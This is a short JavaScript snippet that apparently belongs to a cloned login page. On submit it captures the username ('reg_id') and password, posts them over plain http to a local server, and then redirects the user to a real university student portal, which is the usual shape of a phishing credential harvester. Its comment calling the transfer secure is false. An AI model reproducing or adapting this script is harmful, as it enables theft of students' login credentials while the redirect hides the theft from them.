document.getElementById("login-form").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent the default form submission behavior
  
    // Retrieve the entered username and password values
    var username = document.getElementById("reg_id").value;
    var password = document.getElementById("password").value;
  
    // Perform any necessary validation or encryption on the username and password
  
    // Send the username and password securely to the server-side script for processing
    fetch("http://localhost:3000/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ username: username, password: password })
    })
    .then(response => {
      console.log("Your username and password have been sent to the server for processing");
      window.location.href = 'https://portals.au.edu.pk/students/'; // Redirect the user when form submit
    })
    .catch(error => {
      console.log("An error occurred while sending the request");
    });
});
